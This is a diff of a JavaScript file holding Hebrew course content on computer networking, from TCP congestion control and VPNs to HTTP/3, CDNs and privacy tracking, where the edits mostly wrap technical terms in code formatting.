+          <p><code>Dup-ACKs</code> = כנראה חבילה בודדת אבדה, הרשת עדיין עובדת.</p>
         `
       },
       {
@@ -4031,10 +4031,10 @@ RTTVAR = (1 - β) × RTTVAR + β × |SRTT - RTT_sample|</code></pre>
         content: `
           <table class="content-table">
             <tr><th>אלגוריתם</th><th>הגישה</th><th>שימוש</th></tr>
-            <tr><td><strong>TCP Reno</strong></td><td>AIMD קלאסי, מגיב לאובדן</td><td>היסטורי, ברירת מחדל ישנה</td></tr>
-            <tr><td><strong>TCP CUBIC</strong></td><td>פונקציה קוביקית של הזמן מאז האובדן האחרון. אגרסיבי יותר ב-high-BDP</td><td>Linux ברירת מחדל</td></tr>
-            <tr><td><strong>BBR</strong> — Google</td><td>Bottleneck Bandwidth + RTT. מודד רוחב פס ולא מסתמך על אובדן כסימן</td><td>YouTube, Google Cloud. מצוין ב-WiFi ולווין</td></tr>
-            <tr><td><strong>QUIC/HTTP3</strong></td><td>UDP עם congestion control מובנה + TLS 1.3. מנגנון נפרד לכל stream</td><td>Google (60% תעבורה), HTTP/3</td></tr>
+            <tr><td><strong><code>TCP Reno</code></strong></td><td><code>AIMD</code> קלאסי, מגיב לאובדן</td><td>היסטורי, ברירת מחדל ישנה</td></tr>
+            <tr><td><strong><code>TCP CUBIC</code></strong></td><td>פונקציה קוביקית של הזמן מאז האובדן האחרון. אגרסיבי יותר ב-<code>high-BDP</code></td><td><code>Linux</code> ברירת מחדל</td></tr>
+            <tr><td><strong><code>BBR</code></strong> — <code>Google</code></td><td><code>Bottleneck Bandwidth</code> + <code>RTT</code>. מודד רוחב פס ולא מסתמך על אובדן כסימן</td><td><code>YouTube</code>, <code>Google Cloud</code>. מצוין ב-<code>WiFi</code> ולווין</td></tr>
+            <tr><td><strong><code>QUIC</code>/<code>HTTP3</code></strong></td><td><code>UDP</code> עם <code>congestion control</code> מובנה + <code>TLS 1.3</code>. מנגנון נפרד לכל <code>stream</code></td><td><code>Google</code> (60% תעבורה), <code>HTTP/3</code></td></tr>
           </table>
           <p><strong>BDP</strong> — <code>Bandwidth-Delay Product</code></p>
           <p>רוחב פס כפול זמן ה-<code>RTT</code>.</p>
@@ -4083,12 +4083,12 @@ RTTVAR = (1 - β) × RTTVAR + β × |SRTT - RTT_sample|</code></pre>
           <div class="chapter-summary">
             <h3>נקודות מפתח:</h3>
             <ul>
-              <li>Flow Control: rwnd – המקבל מודיע כמה מקום יש. שולח לא שולח יותר</li>
-              <li>Congestion Control: cwnd – שולח מנהל עצמו לפי עומס רשת</li>
-              <li>Slow Start: גידול אקספוננציאלי. Congestion Avoidance — AIMD: לינארי</li>
-              <li>Loss: Timeout → cwnd=1. 3 Dup-ACKs → Fast Retransmit + Fast Recovery — cwnd=ssthresh</li>
-              <li>RTO = SRTT + 4×RTTVAR. Karn's Algorithm. Exponential Backoff</li>
-              <li>CUBIC — Linux, BBR — Google, QUIC/HTTP3 — אלגוריתמים מודרניים</li>
+              <li><code>Flow Control</code>: <code>rwnd</code> – המקבל מודיע כמה מקום יש. שולח לא שולח יותר</li>
+              <li><code>Congestion Control</code>: <code>cwnd</code> – שולח מנהל עצמו לפי עומס רשת</li>
+              <li><code>Slow Start</code>: גידול אקספוננציאלי. <code>Congestion Avoidance</code> — <code>AIMD</code>: לינארי</li>
+              <li><code>Loss</code>: <code>Timeout</code> → <code>cwnd</code>=1. 3 <code>Dup-ACKs</code> → <code>Fast Retransmit</code> + <code>Fast Recovery</code> — <code>cwnd</code>=<code>ssthresh</code></li>
+              <li><code>RTO</code> = <code>SRTT</code> + 4×<code>RTTVAR</code>. <code>Karn's Algorithm</code>. <code>Exponential Backoff</code></li>
+              <li><code>CUBIC</code> — <code>Linux</code>, <code>BBR</code> — <code>Google</code>, <code>QUIC</code>/<code>HTTP3</code> — אלגוריתמים מודרניים</li>
             </ul>
           </div>
         `
@@ -4149,24 +4149,24 @@ RTTVAR = (1 - β) × RTTVAR + β × |SRTT - RTT_sample|</code></pre>
         type: "explanation",
         title: "IPsec – VPN ברמת Layer 3",
         content: `
-          <p><strong>IPsec</strong> פועל בשכבת הרשת — Layer 3.</p>
+          <p><strong><code>IPsec</code></strong> פועל בשכבת הרשת — <code>Layer 3</code>.</p>
           <p>מספק: אימות, שלמות, הצפנה, ומניעת replay.</p>
           <p><strong>שני פרוטוקולים:</strong></p>
           <ul>
-            <li><strong>AH</strong> — <code>Authentication Header</code>. אימות ושלמות בלבד, ללא הצפנה. פרוטוקול 51</li>
-            <li><strong>ESP</strong> — <code>Encapsulating Security Payload</code>. הצפנה + אימות + שלמות. פרוטוקול 50. <strong>זה מה שמשתמשים בפועל</strong></li>
+            <li><strong><code>AH</code></strong> — <code>Authentication Header</code>. אימות ושלמות בלבד, ללא הצפנה. פרוטוקול 51</li>
+            <li><strong><code>ESP</code></strong> — <code>Encapsulating Security Payload</code>. הצפנה + אימות + שלמות. פרוטוקול 50. <strong>זה מה שמשתמשים בפועל</strong></li>
           </ul>
           <p><strong>שני מצבים:</strong></p>
           <table class="content-table">
             <tr><th>מצב</th><th>מה מוצפן</th><th>שימוש</th></tr>
-            <tr><td>Transport</td><td>Payload בלבד, IP Header גלוי</td><td>Host-to-Host</td></tr>
-            <tr><td>Tunnel</td><td>כל הפקטה המקורית עטופה בפקטה חדשה</td><td>VPN Gateways, Site-to-Site</td></tr>
+            <tr><td><code>Transport</code></td><td><code>Payload</code> בלבד, <code>IP Header</code> גלוי</td><td><code>Host-to-Host</code></td></tr>
+            <tr><td><code>Tunnel</code></td><td>כל הפקטה המקורית עטופה בפקטה חדשה</td><td><code>VPN Gateways</code>, <code>Site-to-Site</code></td></tr>
           </table>
           <p><strong>IKE</strong> — <code>Internet Key Exchange</code></p>
           <p>שלב חילופי המפתחות, <code>UDP</code> פורט 500:</p>
           <ul>
-            <li><strong>IKEv1</strong> — שני שלבים — Phase 1 + Phase 2. גרסה ישנה</li>
-            <li><strong>IKEv2</strong> — מועדף. יעיל יותר, <code>NAT Traversal</code> מובנה — <code>UDP</code> 4500, תמיכה ב-<code>MOBIKE</code></li>
+            <li><strong><code>IKEv1</code></strong> — שני שלבים — Phase 1 + Phase 2. גרסה ישנה</li>
+            <li><strong><code>IKEv2</code></strong> — מועדף. יעיל יותר, <code>NAT Traversal</code> מובנה — <code>UDP</code> 4500, תמיכה ב-<code>MOBIKE</code></li>
           </ul>
           <p><strong>קריפטוגרפיה:</strong></p>
           <ul>
@@ -4203,7 +4203,7 @@ AllowedIPs = 10.0.0.2/32
 Endpoint = peer.example.com:51820</code></pre>
           </div>
           <p><strong>ביצועים:</strong> WireGuard מהיר ב-50–100% מ-OpenVPN, קרוב ל-IPsec.</p>
-          <p>מצוין ל-mobile — reconnect אחרי מעבר WiFi↔Cellular מהיר וחלק.</p>
+          <p>מצוין ל-mobile — reconnect אחרי מעבר <code>WiFi</code>↔<code>Cellular</code> מהיר וחלק.</p>
         `
       },
       {
@@ -4211,7 +4211,7 @@ Endpoint = peer.example.com:51820</code></pre>
         title: "OpenVPN ו-Split Tunneling",
         content: `
           <p><strong>OpenVPN</strong> – VPN מבוסס <code>TLS</code>.</p>
-          <p>עובד על TCP 443 או UDP 1194. עובר בקלות דרך Firewalls, כי פורט 443 נראה כמו HTTPS רגיל.</p>
+          <p>עובד על <code>TCP</code> 443 או <code>UDP</code> 1194. עובר בקלות דרך <code>Firewalls</code>, כי פורט 443 נראה כמו <code>HTTPS</code> רגיל.</p>
           <p><strong>Full Tunnel לעומת Split Tunneling:</strong></p>
           <table class="content-table">
             <tr><th></th><th>Full Tunnel</th><th>Split Tunnel</th></tr>
@@ -4232,20 +4232,20 @@ Endpoint = peer.example.com:51820</code></pre>
         type: "explanation",
         title: "אבטחת רשת – איומים נפוצים",
         content: `
-          <p><strong>ARP Spoofing / ARP Poisoning</strong></p>
+          <p><strong><code>ARP Spoofing</code> / <code>ARP Poisoning</code></strong></p>
           <p>תוקף שולח הודעת <code>ARP Reply</code> מזויפת: "אני ה-Gateway, כתובת ה-MAC שלי היא XX:XX".</p>
           <p>כתוצאה, כל התעבורה מופנית אליו — מתקפת <code>MITM</code>.</p>
           <p><strong>מניעה:</strong> <code>Dynamic ARP Inspection</code> ב-Switch, או הגדרת כתובות ARP קריטיות כסטטיות.</p>
-          <p><strong>DNS Spoofing / Cache Poisoning</strong></p>
+          <p><strong><code>DNS Spoofing</code> / <code>Cache Poisoning</code></strong></p>
           <p>תוקף מזהם את ה-cache של <code>DNS Resolver</code> בתשובות מזויפות.</p>
           <p>כל מי שמסתמך על אותו Resolver מנותב לשרת פישינג.</p>
           <p><strong>מניעה:</strong> <code>DNSSEC</code>.</p>
-          <p><strong>DoS / DDoS</strong></p>
+          <p><strong><code>DoS</code> / <code>DDoS</code></strong></p>
           <p>הצפת שרת או רשת בתעבורה עד לקריסה.</p>
           <p><strong>דוגמה:</strong></p>
           <p><code>SYN Flood</code> — התוקף שולח כמויות אינסופיות של חבילות <code>SYN</code> ללא <code>ACK</code>. השרת מקצה זיכרון לכל חיבור ומתמלא.</p>
-          <p><strong>מניעה:</strong> <code>SYN Cookies</code>, Rate Limiting, CDN עם Anycast.</p>
-          <p><strong>Port Scanning</strong></p>
+          <p><strong>מניעה:</strong> <code>SYN Cookies</code>, <code>Rate Limiting</code>, <code>CDN</code> עם <code>Anycast</code>.</p>
+          <p><strong><code>Port Scanning</code></strong></p>
           <p>כלי כמו <code>nmap</code> שולח חבילות <code>SYN</code> לכל הפורטים ומזהה אילו פתוחים.</p>
           <p>זהו חלק בסיסי מכל בדיקת חדירה.</p>
           <p><strong>הגנה:</strong> <code>Firewall</code> עם מדיניות <code>default-deny</code> ומינימום פורטים פתוחים.</p>
@@ -4301,12 +4301,12 @@ Endpoint = peer.example.com:51820</code></pre>
           <div class="chapter-summary">
             <h3>נקודות מפתח:</h3>
             <ul>
-              <li>VPN = מנהרה מוצפנת. Remote Access (עובד מהבית), Site-to-Site (בין משרדים)</li>
-              <li>IPsec: ESP (הצפנה + אימות), Tunnel mode (כל הפקטה עטופה). IKEv2 מועדף</li>
-              <li>WireGuard: מינימליסטי, מהיר, UDP, keys בלבד. Kernel-native ב-Linux</li>
-              <li>Split Tunneling: רק רשת ארגונית דרך VPN. Full Tunnel: הכל</li>
-              <li>איומים: ARP Spoofing, DNS Poisoning, SYN Flood, Port Scanning, MITM</li>
-              <li>Zero Trust = אל תאמין, תמיד אמת. גם אחרי כניסה לרשת הארגונית</li>
+              <li><code>VPN</code> = מנהרה מוצפנת. <code>Remote Access</code> (עובד מהבית), <code>Site-to-Site</code> (בין משרדים)</li>
+              <li><code>IPsec</code>: <code>ESP</code> (הצפנה + אימות), <code>Tunnel mode</code> (כל הפקטה עטופה). <code>IKEv2</code> מועדף</li>
+              <li><code>WireGuard</code>: מינימליסטי, מהיר, <code>UDP</code>, <code>keys</code> בלבד. <code>Kernel-native</code> ב-<code>Linux</code></li>
+              <li><code>Split Tunneling</code>: רק רשת ארגונית דרך <code>VPN</code>. <code>Full Tunnel</code>: הכל</li>
+              <li>איומים: <code>ARP Spoofing</code>, <code>DNS Poisoning</code>, <code>SYN Flood</code>, <code>Port Scanning</code>, <code>MITM</code></li>
+              <li><code>Zero Trust</code> = אל תאמין, תמיד אמת. גם אחרי כניסה לרשת הארגונית</li>
             </ul>
           </div>
         `
@@ -4340,7 +4340,7 @@ Endpoint = peer.example.com:51820</code></pre>
         title: "CDN – רשת הפצת תוכן",
         content: `
           <p>כשגולשים ל-Netflix מישראל — הסרטון לא מגיע מאמריקה כל פעם.</p>
-          <p><strong>CDN</strong> — <code>Content Delivery Network</code></p>
+          <p><strong><code>CDN</code></strong> — <code>Content Delivery Network</code></p>
           <p>רשת שרתי "קצה" מפוזרת גלובלית שמגישה תוכן ממקום קרוב.</p>
           <div class="diagram-container">
             <svg viewBox="0 0 340 120" class="content-diagram">
@@ -4385,15 +4385,15 @@ Endpoint = peer.example.com:51820</code></pre>
         type: "explanation",
         title: "Load Balancer – פיזור עומס",
         content: `
-          <p><strong>Load Balancer</strong> מקבל בקשות ומפנה אותן לאחד מכמה שרתים.</p>
+          <p><strong><code>Load Balancer</code></strong> מקבל בקשות ומפנה אותן לאחד מכמה שרתים.</p>
           <p>מאפשר Scale-out (הוספת שרתים) וגם High Availability — שרת נפל? הבקשה הולכת לאחר.</p>
           <p><strong>אלגוריתמי Balancing:</strong></p>
           <table class="content-table">
             <tr><th>אלגוריתם</th><th>הגיון</th><th>מתאים ל</th></tr>
-            <tr><td>Round Robin</td><td>בתור מחזורי</td><td>בקשות שוות זמן עיבוד</td></tr>
-            <tr><td>Least Connections</td><td>לשרת עם הכי פחות חיבורים פעילים</td><td>בקשות שונות זמן עיבוד</td></tr>
-            <tr><td>IP Hash</td><td>hash של IP הלקוח → תמיד אותו שרת</td><td>Session affinity — עגינה</td></tr>
-            <tr><td>Weighted</td><td>שרתים חזקים מקבלים יותר</td><td>שרתים בעלי חומרה שונה</td></tr>
+            <tr><td><code>Round Robin</code></td><td>בתור מחזורי</td><td>בקשות שוות זמן עיבוד</td></tr>
+            <tr><td><code>Least Connections</code></td><td>לשרת עם הכי פחות חיבורים פעילים</td><td>בקשות שונות זמן עיבוד</td></tr>
+            <tr><td><code>IP Hash</code></td><td><code>hash</code> של <code>IP</code> הלקוח → תמיד אותו שרת</td><td><code>Session affinity</code> — עגינה</td></tr>
+            <tr><td><code>Weighted</code></td><td>שרתים חזקים מקבלים יותר</td><td>שרתים בעלי חומרה שונה</td></tr>
           </table>
           <p><strong>שכבות:</strong></p>
           <ul>
@@ -4410,24 +4410,24 @@ Endpoint = peer.example.com:51820</code></pre>
         type: "explanation",
         title: "HTTP/2 ו-HTTP/3 – הדורות הבאים",
         content: `
-          <p><strong>HTTP/1.1</strong> — 1997</p>
+          <p><strong><code>HTTP/1.1</code></strong> — 1997</p>
           <p>עובד במודל בקשה-תגובה.</p>
           <p>כל חיבור מטפל בבקשה אחת בכל פעם.</p>
           <p>הבעיה המרכזית: <code>Head-of-Line Blocking</code> — HOL.</p>
           <p>בקשה שתקועה חוסמת את כל הבקשות שאחריה.</p>
-          <p><strong>HTTP/2</strong> — 2015. שיפורים עיקריים:</p>
+          <p><strong><code>HTTP/2</code></strong> — 2015. שיפורים עיקריים:</p>
           <ul>
-            <li><strong>Multiplexing</strong> – כמה בקשות על חיבור TCP אחד בו-זמנית. פותר HOL blocking ב-Application layer</li>
-            <li><strong>Binary Protocol</strong> – לא טקסט. יעיל יותר לניתוח</li>
+            <li><strong><code>Multiplexing</code></strong> – כמה בקשות על חיבור <code>TCP</code> אחד בו-זמנית. פותר <code>HOL blocking</code> ב-<code>Application layer</code></li>
+            <li><strong><code>Binary Protocol</code></strong> – לא טקסט. יעיל יותר לניתוח</li>
             <li><strong>Header Compression</strong> — <code>HPACK</code>. Headers חוזרים נשלחים רק פעם אחת</li>
             <li><strong>Server Push</strong> — שרת יכול לשלוח resources לפני שהלקוח ביקש — CSS יחד עם HTML</li>
-            <li><strong>Stream Priority</strong> – בקשות ניתנות לתעדוף</li>
+            <li><strong><code>Stream Priority</code></strong> – בקשות ניתנות לתעדוף</li>
           </ul>
-          <p><strong>HTTP/3</strong> — 2022. מעל <code>QUIC</code> — <code>UDP</code>:</p>
+          <p><strong><code>HTTP/3</code></strong> — 2022. מעל <code>QUIC</code> — <code>UDP</code>:</p>
           <ul>
-            <li><strong>QUIC</strong> – UDP עם congestion control + TLS 1.3 מובנה. תומך ב-0-RTT Handshake</li>
+            <li><strong><code>QUIC</code></strong> – <code>UDP</code> עם <code>congestion control</code> + <code>TLS 1.3</code> מובנה. תומך ב-<code>0-RTT Handshake</code></li>
             <li><strong>אין HOL Blocking גם ב-TCP level</strong> – כל stream עצמאי. ב-HTTP/2, חבילת TCP אבודה חוסמת את כל ה-streams</li>
-            <li><strong>Connection Migration</strong> – מבוסס על Connection ID, לא IP:Port. מעבר WiFi → Cellular ללא ניתוק</li>
+            <li><strong><code>Connection Migration</code></strong> – מבוסס על <code>Connection ID</code>, לא <code>IP:Port</code>. מעבר <code>WiFi</code> → <code>Cellular</code> ללא ניתוק</li>
           </ul>
           <p>כ-60% מתעבורת YouTube היא HTTP/3.</p>
           <p>Cloudflare, Google ו-Facebook — כולם HTTP/3.</p>
@@ -4437,7 +4437,7 @@ Endpoint = peer.example.com:51820</code></pre>
         type: "explanation",
         title: "REST API ו-WebSockets",
         content: `
-          <p><strong>REST API</strong> — <code>Representational State Transfer</code></p>
+          <p><strong><code>REST API</code></strong> — <code>Representational State Transfer</code></p>
           <p>ארכיטקטורת API על <code>HTTP</code>.</p>
           <p>כל משאב = URL. פעולות = HTTP Methods:</p>
           <table class="content-table">
@@ -4459,7 +4459,7 @@ Endpoint = peer.example.com:51820</code></pre>
             <li><code>404</code> — Not Found — לא נמצא</li>
             <li><code>500</code> — Server Error — שגיאת שרת</li>
           </ul>
-          <p><strong>WebSockets</strong> – חיבור דו-כיווני מתמשך מעל <code>HTTP</code>.</p>
+          <p><strong><code>WebSockets</code></strong> – חיבור דו-כיווני מתמשך מעל <code>HTTP</code>.</p>
           <p>החיבור מתחיל בבקשת <code>Upgrade</code> מ-HTTP ל-WebSocket.</p>
           <p>אחרי השדרוג, שני הצדדים יכולים לשלוח ולקבל מידע בחופשיות — ללא התקורה של מודל בקשה-תגובה.</p>
           <p><strong>שימושים נפוצים:</strong></p>
@@ -4483,8 +4483,8 @@ ws.onmessage = (e) => console.log(JSON.parse(e.data))</code></pre>
         content: `
           <p><strong>Monolith לעומת Microservices:</strong></p>
           <ul>
-            <li><strong>Monolith</strong> — כל הקוד ביישום אחד גדול. פשוט לפתח, קשה להרחיב</li>
-            <li><strong>Microservices</strong> — כל פיצ'ר הוא שירות עצמאי. שירותים מתקשרים ביניהם דרך <code>HTTP</code> או <code>gRPC</code></li>
+            <li><strong><code>Monolith</code></strong> — כל הקוד ביישום אחד גדול. פשוט לפתח, קשה להרחיב</li>
+            <li><strong><code>Microservices</code></strong> — כל פיצ'ר הוא שירות עצמאי. שירותים מתקשרים ביניהם דרך <code>HTTP</code> או <code>gRPC</code></li>
           </ul>
           <div class="diagram-container">
             <svg viewBox="0 0 340 100" class="content-diagram">
@@ -4505,17 +4505,17 @@ ws.onmessage = (e) => console.log(JSON.parse(e.data))</code></pre>
               <text x="305" y="78" text-anchor="middle" font-size="8">Search</text>
             </svg>
           </div>
-          <p><strong>Service Mesh</strong> — <code>Istio</code>, <code>Linkerd</code>:</p>
-          <p>בארכיטקטורת microservices, כל שירות מתקשר עם עשרות שירותים אחרים.</p>
-          <p>Service Mesh מוסיף <code>sidecar proxy</code> ליד כל שירות, שמטפל אוטומטית ב:</p>
+          <p><strong><code>Service Mesh</code></strong> — <code>Istio</code>, <code>Linkerd</code>:</p>
+          <p>בארכיטקטורת <code>microservices</code>, כל שירות מתקשר עם עשרות שירותים אחרים.</p>
+          <p><code>Service Mesh</code> מוסיף <code>sidecar proxy</code> ליד כל שירות, שמטפל אוטומטית ב:</p>
           <ul>
             <li><code>TLS</code> בין שירותים</li>
-            <li>Load Balancing</li>
-            <li>Circuit Breaking — ניתוק שירות תקול</li>
-            <li>Tracing — מעקב אחרי בקשות</li>
+            <li><code>Load Balancing</code></li>
+            <li><code>Circuit Breaking</code> — ניתוק שירות תקול</li>
+            <li><code>Tracing</code> — מעקב אחרי בקשות</li>
           </ul>
           <p>כל זאת ללא שינוי בקוד של השירות עצמו.</p>
-          <p><strong>API Gateway</strong> – נקודת כניסה אחת לכל ה-microservices.</p>
+          <p><strong><code>API Gateway</code></strong> – נקודת כניסה אחת לכל ה-<code>microservices</code>.</p>
           <p>מטפל ב:</p>
           <ul>
             <li>אימות — <code>Auth</code></li>
@@ -4564,12 +4564,12 @@ ws.onmessage = (e) => console.log(JSON.parse(e.data))</code></pre>
           <div class="chapter-summary">
             <h3>נקודות מפתח:</h3>
             <ul>
-              <li>CDN: PoPs גלובליים + Anycast. Cache HIT = מהיר. Cache MISS = מ-Origin. מגן מ-DDoS</li>
-              <li>Load Balancer: L4 — TCP / L7 — HTTP. Round Robin, Least Connections, IP Hash. Health Checks</li>
-              <li>HTTP/2: Multiplexing, Binary, HPACK, Server Push. HTTP/3: QUIC — UDP, 0-RTT, Connection Migration</li>
-              <li>REST: GET/POST/PUT/PATCH/DELETE על URLs. JSON. WebSockets: חיבור דו-כיווני מתמשך</li>
-              <li>Microservices: שירותים עצמאיים. Service Mesh: sidecar proxy. API Gateway: כניסה אחת</li>
-              <li>Anycast = אותה IP במקומות רבים. Edge Computing = קוד ב-PoP הקרוב</li>
+              <li><code>CDN</code>: <code>PoPs</code> גלובליים + <code>Anycast</code>. <code>Cache HIT</code> = מהיר. <code>Cache MISS</code> = מ-<code>Origin</code>. מגן מ-<code>DDoS</code></li>
+              <li><code>Load Balancer</code>: <code>L4</code> — <code>TCP</code> / <code>L7</code> — <code>HTTP</code>. <code>Round Robin</code>, <code>Least Connections</code>, <code>IP Hash</code>. <code>Health Checks</code></li>
+              <li><code>HTTP/2</code>: <code>Multiplexing</code>, <code>Binary</code>, <code>HPACK</code>, <code>Server Push</code>. <code>HTTP/3</code>: <code>QUIC</code> — <code>UDP</code>, <code>0-RTT</code>, <code>Connection Migration</code></li>
+              <li><code>REST</code>: <code>GET</code>/<code>POST</code>/<code>PUT</code>/<code>PATCH</code>/<code>DELETE</code> על <code>URLs</code>. <code>JSON</code>. <code>WebSockets</code>: חיבור דו-כיווני מתמשך</li>
+              <li><code>Microservices</code>: שירותים עצמאיים. <code>Service Mesh</code>: <code>sidecar proxy</code>. <code>API Gateway</code>: כניסה אחת</li>
+              <li><code>Anycast</code> = אותה <code>IP</code> במקומות רבים. <code>Edge Computing</code> = קוד ב-<code>PoP</code> הקרוב</li>
             </ul>
           </div>
         `
@@ -4822,12 +4822,12 @@ Why not? → code review checklist didn't include DB review.</code></pre>
           <div class="chapter-summary">
             <h3>נקודות מפתח:</h3>
             <ul>
-              <li>BGP = פרוטוקול "מפת האינטרנט". ביטול prefix → נעלמת מהרשת. אין authentication מובנה</li>
-              <li>SQL Slammer (2003): 376 בתים, 10 דקות, 75K שרתים נגועים. Patch היה קיים. לא עודכנו</li>
-              <li>BGP Leaks: כל AS יכול להכריז על כל prefix. RPKI = פתרון קריפטוגרפי חלקי</li>
-              <li>Postmortem: blameless, timeline, 5 Why's, action items. לא עונשים — לומדים</li>
-              <li>Chaos Engineering: מזריקים כשלים בכוונה לגלות חולשות. Netflix Chaos Monkey ב-production יומיומי</li>
-              <li>לקח עמוק: single point of failure = בעיה. redundancy + runbooks + testing = survival</li>
+              <li><code>BGP</code> = פרוטוקול "מפת האינטרנט". ביטול <code>prefix</code> → נעלמת מהרשת. אין <code>authentication</code> מובנה</li>
+              <li><code>SQL Slammer</code> (2003): 376 בתים, 10 דקות, 75K שרתים נגועים. <code>Patch</code> היה קיים. לא עודכנו</li>
+              <li><code>BGP Leaks</code>: כל <code>AS</code> יכול להכריז על כל <code>prefix</code>. <code>RPKI</code> = פתרון קריפטוגרפי חלקי</li>
+              <li><code>Postmortem</code>: <code>blameless</code>, <code>timeline</code>, 5 Why's, action items. לא עונשים — לומדים</li>
+              <li><code>Chaos Engineering</code>: מזריקים כשלים בכוונה לגלות חולשות. <code>Netflix</code> <code>Chaos Monkey</code> ב-<code>production</code> יומיומי</li>
+              <li>לקח עמוק: <code>single point of failure</code> = בעיה. <code>redundancy</code> + <code>runbooks</code> + testing = survival</li>
             </ul>
           </div>
         `
@@ -5058,11 +5058,11 @@ vs. Python/Java thread: 8-512MB per thread
           <div class="chapter-summary">
             <h3>נקודות מפתח:</h3>
             <ul>
-              <li>Netflix Open Connect: OCA ב-ISPs — טעינת ה-cache מראש מתרחשת לפני הצפייה. ~100Gbps per appliance</li>
-              <li>WhatsApp: Erlang = מיליון חיבורים קונקורנטיים ב-2GB RAM. פחות פיצ'רים = scale גדול</li>
-              <li>Google B4: SD-WAN פרטי, OpenFlow controller, 100% bandwidth utilization, hardware מותאם</li>
-              <li>כבלי ים: 99% מהתנועה הבינלאומית. Google/Meta/Microsoft בנו כבלים פרטיים</li>
-              <li>Cloudflare Anycast: אותה IP ב-300 PoPs. BGP = ניתוב אוטומטי לקרוב ביותר. 5.6 Tbps DDoS ספוג</li>
+              <li><code>Netflix Open Connect</code>: <code>OCA</code> ב-<code>ISPs</code> — טעינת ה-<code>cache</code> מראש מתרחשת לפני הצפייה. ~100Gbps per appliance</li>
+              <li><code>WhatsApp</code>: <code>Erlang</code> = מיליון חיבורים קונקורנטיים ב-2GB <code>RAM</code>. פחות פיצ'רים = scale גדול</li>
+              <li><code>Google B4</code>: <code>SD-WAN</code> פרטי, <code>OpenFlow controller</code>, 100% <code>bandwidth utilization</code>, <code>hardware</code> מותאם</li>
+              <li>כבלי ים: 99% מהתנועה הבינלאומית. <code>Google</code>/<code>Meta</code>/<code>Microsoft</code> בנו כבלים פרטיים</li>
+              <li><code>Cloudflare Anycast</code>: אותה <code>IP</code> ב-300 <code>PoPs</code>. <code>BGP</code> = ניתוב אוטומטי לקרוב ביותר. 5.6 Tbps <code>DDoS</code> ספוג</li>
               <li>רשת = כוח גיאופוליטי. מי בונה = מי מנטר</li>
             </ul>
           </div>
@@ -5296,12 +5296,12 @@ const fingerprint = canvas.toDataURL()
           <div class="chapter-summary">
             <h3>נקודות מפתח:</h3>
             <ul>
-              <li>ISP רואה: כל DNS query, TLS SNI (שם הדומיין), IP addresses. לא את תוכן HTTPS</li>
-              <li>Browser Fingerprint: canvas, fonts, WebGL, screen = זיהוי ייחודי כמעט ללא cookies</li>
-              <li>Third-party tracking: Meta Pixel ב-30%+ אתרים. רואה אותך גם ללא לחיצה</li>
-              <li>Tor = Onion Routing: 3 nodes, שכבות הצפנה. שום node לא יודע הכל. איטי</li>
-              <li>Incognito = local only. ISP, Google, ISP Admin — עדיין רואים</li>
-              <li>Metadata גרוע מcontent. "מי דיבר עם מי" = תמונה מלאה ללא תוכן</li>
+              <li><code>ISP</code> רואה: כל <code>DNS query</code>, <code>TLS SNI</code> (שם הדומיין), <code>IP addresses</code>. לא את תוכן <code>HTTPS</code></li>
+              <li><code>Browser Fingerprint</code>: <code>canvas</code>, <code>fonts</code>, <code>WebGL</code>, <code>screen</code> = זיהוי ייחודי כמעט ללא <code>cookies</code></li>
+              <li><code>Third-party tracking</code>: <code>Meta Pixel</code> ב-30%+ אתרים. רואה אותך גם ללא לחיצה</li>
+              <li><code>Tor</code> = <code>Onion Routing</code>: 3 <code>nodes</code>, שכבות הצפנה. שום node לא יודע הכל. איטי</li>
+              <li><code>Incognito</code> = local only. <code>ISP</code>, <code>Google</code>, ISP Admin — עדיין רואים</li>
+              <li><code>Metadata</code> גרוע מ<code>content</code>. "מי דיבר עם מי" = תמונה מלאה ללא תוכן</li>
             </ul>
           </div>
         `
@@ -5334,15 +5334,15 @@ const fingerprint = canvas.toDataURL()
         type: "explanation",
         title: "QUIC – הפרוטוקול שהחליף TCP",
         content: `
-          <p><strong>QUIC</strong> פותח ב-Google ב-2012, הפך לסטנדרט IETF (RFC 9000) ב-2021.</p>
+          <p><strong><code>QUIC</code></strong> פותח ב-<code>Google</code> ב-2012, הפך לסטנדרט IETF (RFC 9000) ב-2021.</p>
           <p>הוא הבסיס ל-<code>HTTP/3</code>. כיום: ~25% מתנועת האינטרנט רצה על <code>QUIC</code>.</p>
-          <p><strong>מה QUIC פותר?</strong></p>
+          <p><strong>מה <code>QUIC</code> פותר?</strong></p>
           <table class="content-table">
-            <tr><th>בעיה ב-TCP/TLS</th><th>פתרון QUIC</th></tr>
-            <tr><td>Handshake = 3-way TCP + TLS 1.3 = 2 round trips</td><td>0-RTT / 1-RTT — connection + crypto ב-round trip אחד</td></tr>
-            <tr><td>HOL Blocking: חבילה אחת אבודה עוצרת כולם</td><td>Streams עצמאיים — חבילה אבודה משפיעה רק על stream אחד</td></tr>
-            <tr><td>TCP ב-kernel — קשה לעדכן ולשנות</td><td>QUIC ב-userspace — Google עדכנה מהר ב-Chrome ובשרתים</td></tr>
-            <tr><td>Connection tied to IP:Port — מנותק בשינוי WiFi</td><td>Connection ID — נשאר connected גם אחרי שינוי IP (roaming)</td></tr>
+            <tr><th>בעיה ב-<code>TCP</code>/<code>TLS</code></th><th>פתרון <code>QUIC</code></th></tr>
+            <tr><td><code>Handshake</code> = 3-way <code>TCP</code> + <code>TLS 1.3</code> = 2 round trips</td><td><code>0-RTT</code> / <code>1-RTT</code> — connection + crypto ב-round trip אחד</td></tr>
+            <tr><td><code>HOL Blocking</code>: חבילה אחת אבודה עוצרת כולם</td><td><code>Streams</code> עצמאיים — חבילה אבודה משפיעה רק על stream אחד</td></tr>
+            <tr><td><code>TCP</code> ב-<code>kernel</code> — קשה לעדכן ולשנות</td><td><code>QUIC</code> ב-<code>userspace</code> — <code>Google</code> עדכנה מהר ב-<code>Chrome</code> ובשרתים</td></tr>
+            <tr><td><code>Connection</code> tied to <code>IP:Port</code> — מנותק בשינוי <code>WiFi</code></td><td><code>Connection ID</code> — נשאר connected גם אחרי שינוי <code>IP</code> (<code>roaming</code>)</td></tr>
           </table>
           <div class="diagram-container">
             <svg viewBox="0 0 360 100" class="content-diagram">
@@ -5369,7 +5369,7 @@ const fingerprint = canvas.toDataURL()
         type: "explanation",
         title: "eBPF – תכנות ה-Kernel ללא תכנות Kernel",
         content: `
-          <p><strong>eBPF</strong> (extended Berkeley Packet Filter) — אחד מהשינויים המהפכניים ביותר ב-Linux בעשור האחרון.</p>
+          <p><strong><code>eBPF</code></strong> (extended Berkeley Packet Filter) — אחד מהשינויים המהפכניים ביותר ב-Linux בעשור האחרון.</p>
